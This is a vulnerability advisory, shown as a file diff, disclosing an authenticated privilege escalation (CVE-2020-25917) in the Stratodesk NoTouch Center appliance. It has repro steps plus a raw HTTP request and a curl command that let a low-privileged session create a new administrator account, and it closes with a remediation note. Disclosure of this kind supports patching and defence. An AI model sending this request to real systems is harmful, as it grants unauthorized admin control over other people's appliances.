@@ -1,0 +1,49 @@
+id: 35545
+date: 12/22/2020
+title: Stratodesk NoTouch Center Privilege Escalation Vulnerability
+author: Jeremy Brown
+cves: CVE-2020-25917
+
+Stratodesk NoTouch Center Virtual Appliance is a portal for managing NoTouch clients. It appears that Stratodesk has a partnership with ViewSonic and produced these appliances to support some of their hardware devices as well.
+
+- https://www.stratodesk.com/products/notouch-desktop/virtual-appliance/
+- https://www.viewsonic.com/eu/products/desktop-virtualization/SC-T25.php
+
+=Authenticated privilege escalation from low privileged user to admin=
+
+The user management security strategy seems to be just hiding the options in the Web UI from unprivileged users, but they can still call admin-related functions manually. Many different admin requests are available to be called by non-admin users with the root cause being the same. The add user functionality is just the biggest impact demonstration of this issue.
+
+A low privileged user on the platform, for example a user with “helpdesk” privileges (which is level 4 in their system of 1-4 privilege levels with 1=admin), can perform privileged operations including adding a new administrator to the platform.
+
+Repro
+
+    1) Create a low privileged user
+    2) Login as such user and capture this user’s JSESSIONID in the Cookie header
+    3) Insert your ID in the below request where the JESSIONID data is
+    4) Login as admin2 and see that you now have admin privileges
+
+POST /easyadmin/user/submitCreateTCUser.do HTTP/1.1
+Host: stratodesk-server
+Content-Type: application/x-www-form-urlencoded
+Content-Length: XX
+Cookie: JSESSIONID=[XXXXXXXX...]
+
+func=save&userid=0&name=admin2&fullname=admin2&password=Secret2&seclevel=1
+
+"As cURL command"
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: stratodesk-server' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: XX' -H $'Cookie: JSESSIONID=XXXXXXXX...' \
+    -b $'JSESSIONID=XXXXXXXX...' \
+    --data-binary $'func=save&userid=0&name=admin2&fullname=admin22&password=Secret222&seclevel=1' \
+    $'https://stratodesk-server/easyadmin/user/submitCreateTCUser.do'
+
+Remediation
+
+Fixed in NoTouch package v4.4.68 (unclear which if any OVA releases contain the updated packages)
+
+CVE-2020-25917
+
+Discovered and disclosed by Jeremy Brown / December 2020
+
+#  0day.today [2023-03-22]  #
